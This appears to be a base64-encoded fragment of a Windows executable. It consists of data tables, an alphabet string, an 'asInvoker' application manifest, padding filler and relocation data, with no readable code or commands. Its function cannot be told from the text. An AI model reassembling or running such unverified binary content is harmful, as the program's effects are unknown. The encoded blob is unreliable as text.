bg5vDnAOcQ5yDnMOdA51DnYOdw54DnkOeg57DnwOfQ5+Dn8OQA6BDoIOgw6EDoUOhg6HDogOiQ6KDosOjA6NDo4Ojw6QDpEOkg6WDpgOmQ6aDpsOnA6dDp4Onw6gDqEOpA6oDqoOiA9JD0oPSw9MD00PTg9PD1APUQ9SD1MPVQ9XD1kPWw9dD18PYQ9jD2UPZw9pD2sPbQ9vD3EPcw91D3cPeQ97D30Pfw9BD6wPrQ+YD+AP4Q/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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